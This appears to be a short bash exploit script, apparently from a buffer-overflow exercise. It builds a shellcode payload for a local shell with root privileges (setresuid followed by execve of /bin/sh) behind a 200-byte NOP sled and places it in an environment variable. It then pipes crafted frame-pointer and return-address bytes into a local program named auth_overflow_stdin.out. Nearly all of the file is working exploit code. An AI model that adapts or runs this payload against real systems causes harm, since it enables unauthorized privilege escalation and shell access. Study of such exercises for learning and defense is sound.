#!/bin/bash
main() {
	SHELLCODE="\x31\xc0\x31\xdb\x31\xc9\x99\xb0\xa4\xcd\x80\x6a\x0b\x58\x51\x68"
	SHELLCODE+="\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x89\xe2\x53\x89"
	SHELLCODE+="\xe1\xcd\x80"
	SLED="\x90"

	EXPLOIT=$(perl -e "print \"$SLED\" x 200")$(printf $SHELLCODE)
	# EXPLOIT=$(printf $SHELLCODE)
	export EXPLOIT
	echo "$EXPLOIT" > /tmp/shellcode.bin
	echo "$EXPLOIT" | xxd
	# ./check_env EXPLOIT

	RETURN_ADDRESS="\xdf\xdc\xff\xff\xff\x7f\x00\x00"
	# FRAME_POINTER="\x00\x00\x00\x00\x00\x00\x00\x00"
	# FRAME_POINTER="\xb0\xd9\xff\xff\xff\x7f\x00\x00"
	FRAME_POINTER="\x70\xd8\xff\xff\xff\x7f\x00\x00"
	perl -e "print \"${FRAME_POINTER}${RETURN_ADDRESS}\" x2" | xxd
	perl -e "print \"${FRAME_POINTER}${RETURN_ADDRESS}\" x2" > /tmp/input
	perl -e "print \"${FRAME_POINTER}${RETURN_ADDRESS}\" x2" | ./auth_overflow_stdin.out
}

main
